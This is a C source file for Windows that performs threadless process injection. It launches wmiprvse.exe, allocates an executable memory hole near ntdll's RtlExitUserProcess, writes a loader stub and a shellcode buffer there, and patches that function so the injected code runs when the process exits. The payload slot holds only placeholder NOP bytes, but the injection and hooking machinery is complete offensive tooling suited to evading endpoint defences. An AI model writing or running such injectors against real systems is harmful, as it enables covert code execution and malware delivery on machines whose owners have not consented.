#include <stdio.h>
#include <windows.h>
#include <stdint.h>

#define CMDLINE "c:\\windows\\system32\\wbem\\wmiprvse.exe -Embedding"

typedef struct
{
	DWORD dwProcessId;
	HWND hwndWindow;
} ProcessWindow;

unsigned char shellcode_loader[] = {
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90
};

/* length: 894 bytes */
unsigned char shellcode[] = "\x90\x90\x90\x90";

void ConcatArrays(unsigned char* result, const unsigned char* arr1, size_t arr1Size, const unsigned char* arr2, size_t arr2Size) {
	// Copy elements from the first array
	for (size_t i = 0; i < arr1Size; ++i) {
		result[i] = arr1[i];
	}

	// Copy elements from the second array
	for (size_t i = 0; i < arr2Size; ++i) {
		result[arr1Size + i] = arr2[i];
	}
}

BOOL CALLBACK EnumWindowCallBack(HWND hWnd, LPARAM lParam)
{
	ProcessWindow* pProcessWindow = (ProcessWindow*)lParam;

	DWORD dwProcessId;
	GetWindowThreadProcessId(hWnd, &dwProcessId);

	if (pProcessWindow->dwProcessId == dwProcessId)
	{
		pProcessWindow->hwndWindow = hWnd;
		return FALSE;
	}
	return TRUE;
}

int64_t FindMemoryHole(IN HANDLE hProcess, IN void** exportedFunctionAddress, IN int size)
{
	UINT_PTR  remoteAddress;
	BOOL foundMemory = FALSE;
	uint64_t exportAddress = exportedFunctionAddress;

	for (remoteAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
		remoteAddress < exportAddress + 0x70000000;
		remoteAddress += 0x10000)
	{
		LPVOID lpAddr = VirtualAllocEx(hProcess, remoteAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (lpAddr == NULL)
		{
			continue;
		}
		foundMemory = TRUE;
		break;
	}

	if (foundMemory == TRUE)
	{
		printf("[*] Found Memory Hole: %p\n", remoteAddress);
		return remoteAddress;
	}

	return 0;

}

void GenerateHook(int64_t originalInstruction)
{
	*(uint64_t*)(shellcode_loader + 0x12) = originalInstruction;
	printf("[+] Hook successfully placed\n");
}

int main()
{
	BOOL rez = FALSE;
	int writtenBytes = 0;

	//Getting the address of specific function of the DLL
	printf("[*] Getting the address of RtlExitUserProcess\n");
	void* exportedFunctionAddress = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlExitUserProcess");
	if (exportedFunctionAddress == NULL)
	{
		printf("[-] Could not find RtlExitUserProcess in ntdll.dll\n");
		return -99;
	}
	printf("[+] ntdll.dll!RtlExitUserProcess Address: 0x%p\n\n", exportedFunctionAddress);

	// Create a Process
	HWND hwndRet = NULL;
	STARTUPINFOA sInfo = { 0 };
	sInfo.cb = sizeof(sInfo);
	PROCESS_INFORMATION pInfo = { 0 };

	sInfo.dwFlags = STARTF_USESHOWWINDOW;
	sInfo.wShowWindow = SW_SHOW;

	printf("[*] Trying to create process to spawn\n");

	if (CreateProcessA(NULL, CMDLINE, NULL, NULL, FALSE, NULL, NULL, NULL, &sInfo, &pInfo))
	{
		ProcessWindow procwin;
		procwin.dwProcessId = pInfo.dwProcessId;
		procwin.hwndWindow = NULL;

		WaitForInputIdle(pInfo.hProcess, 5000);

		EnumWindows(EnumWindowCallBack, (LPARAM)&procwin);
		if (procwin.hwndWindow)
		{
			hwndRet = procwin.hwndWindow;
			printf("[+] Find hwnd: 0x%x\n", hwndRet);
		}

		//Allocating memory holes
		printf("[*] Trying to find memory holes\n");
		int64_t memoryHoleAddress = FindMemoryHole(pInfo.hProcess, exportedFunctionAddress, sizeof(shellcode_loader) + sizeof(shellcode));
		if (memoryHoleAddress == 0)
		{
			printf("[-] Could not find memory hole\n");
			return -99;
		}

		// Reading content from memory address of exported function
		printf("[*] Reading bytes from the memory address of RtlExitUserProcess\n");
		int64_t originalBytes = *(int64_t*)exportedFunctionAddress;
		printf("[+] Address %p has value = %lld\n\n", exportedFunctionAddress, originalBytes);

		// Implementing the hook
		printf("[*] Generating hook\n");
		GenerateHook(originalBytes);

		//Chaning the memory protection settings of the exported function into the calling process to RWX
		printf("[*] Changing the memory protection of RtlExitUserProcess to RWX\n");
		DWORD oldProtect = 0;
		if (!VirtualProtectEx(pInfo.hProcess, exportedFunctionAddress, 8, PAGE_EXECUTE_READWRITE, &oldProtect))
		{
			printf("[-] Could not change the memory protection settings\n");
			return -99;
		}
		printf("[+] Successfully changed the memory protection settings of RtlExitUserProcess to RWX\n");

		// Injecting a call instruction into the exported function
		printf("[*] Trying to inject the call assembly for the exported function\n");
		int callPointerAddress = (memoryHoleAddress - ((UINT_PTR)exportedFunctionAddress + 5));
		unsigned char callFunctionShellcode[] = { 0xe8, 0, 0, 0, 0 };
		*(int*)(callFunctionShellcode + 1) = callPointerAddress;
		VirtualProtectEx(pInfo.hProcess, callFunctionShellcode, sizeof(callFunctionShellcode), PAGE_EXECUTE_READWRITE, NULL);
		if (!WriteProcessMemory(pInfo.hProcess, exportedFunctionAddress, callFunctionShellcode, sizeof(callFunctionShellcode), &writtenBytes))
		{
			printf("[-] Could redirect RtlExitUserProcess\n");
			return -99;
		}
		printf("[+] Successfully modified RtlExitUserProcess function to call the custom shellcode\n");

		// Compiling final payload and injecting the hook
		unsigned char payload[sizeof(shellcode_loader) + sizeof(shellcode)];
		ConcatArrays(&payload, &shellcode_loader, sizeof(shellcode_loader), shellcode, sizeof(shellcode));

		if (!VirtualProtectEx(pInfo.hProcess, memoryHoleAddress, sizeof(payload), PAGE_READWRITE, &oldProtect))
		{
			printf("[-] Modifying the memory protection of the memory hole: %p before write\n", memoryHoleAddress);
			return -99;
		}

		if (!WriteProcessMemory(pInfo.hProcess, memoryHoleAddress, payload, sizeof(payload), &writtenBytes))
		{
			printf("[-] Writing to the memory hole address: %p\n", memoryHoleAddress);
			return -99;
		}

		if (!VirtualProtectEx(pInfo.hProcess, memoryHoleAddress, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect))
		{
			printf("[-] Modifying the memory protection of the memory hole: %p after write\n", memoryHoleAddress);
			return -99;
		}

		printf("\n[+] Injection successful, wait for your trigger function!\n");
		Sleep(2000);

		PostMessageA(hwndRet, WM_CLOSE, NULL, NULL);
	}
}

